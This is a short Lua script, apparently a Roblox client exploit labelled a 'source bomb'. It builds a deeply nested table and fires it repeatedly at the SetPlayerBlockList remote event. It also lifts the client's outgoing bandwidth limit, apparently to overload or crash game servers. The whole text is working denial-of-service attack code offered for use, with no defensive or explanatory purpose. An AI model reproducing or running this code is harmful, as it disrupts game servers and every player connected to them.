-- BROSKI SOURCE BOMB FUNCTION (EXACT)
local DEPTH = 296
local SPAM_DELAY = 0.12

local function buildBomb(power)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, DEPTH do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maxRep = math.floor(power / (DEPTH + 2))
    for i = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

local running = false
local bomb = nil
local spamThread = nil

local function restartSpamLoop()
    if running then
        if spamThread then task.cancel(spamThread) end
        local power = config.isMobileMode and config.mobilePower or config.pcPower
        bomb = buildBomb(power)
        spamThread = task.spawn(function()
            while running do
                if bomb then
                    pcall(function()
                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                    end)
                end
                task.wait(SPAM_DELAY)
            end
        end)
    end
end

local function startBypass()
    if running then return end
    running = true
    NetworkClient:SetOutgoingKBPSLimit(math.huge)
    restartSpamLoop()
end

local function stopBypass()
    running = false
    if spamThread then task.cancel(spamThread) end
    bomb = nil
end

